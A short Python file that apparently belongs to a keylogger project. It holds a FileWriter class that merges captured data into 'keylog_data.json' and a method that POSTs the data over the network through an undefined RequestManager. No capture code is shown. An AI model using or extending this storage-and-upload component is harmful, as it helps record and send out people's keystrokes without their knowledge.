import json
import os
from abc import ABC, abstractmethod

class Logger(ABC):
    @abstractmethod
    def Writes_to_file(self, data: dict):
        pass


class FileWriter(Logger):
    def __init__(self, filename="keylog_data.json"):
        self.filename = filename

    def Writes_to_file(self, data: dict):
        if os.path.exists(self.filename):
            try:
                with open(self.filename, "r", encoding="utf-8") as file:
                    existing_data = json.load(file)
                    if not existing_data: 
                        existing_data = {}
            except (json.JSONDecodeError, FileNotFoundError):
                existing_data = {}
        else:
            existing_data = {}

        existing_data.update(data)

        """שמירת הנתונים לקובץ JSON"""
        with open(self.filename, "w", encoding="utf-8") as f:
            json.dump(existing_data, f, ensure_ascii=False, indent=4)
            
        return self.filename

    def Writes_to_network(self, data: dict):
        RequestManager().handle_request('POST', "data", data)
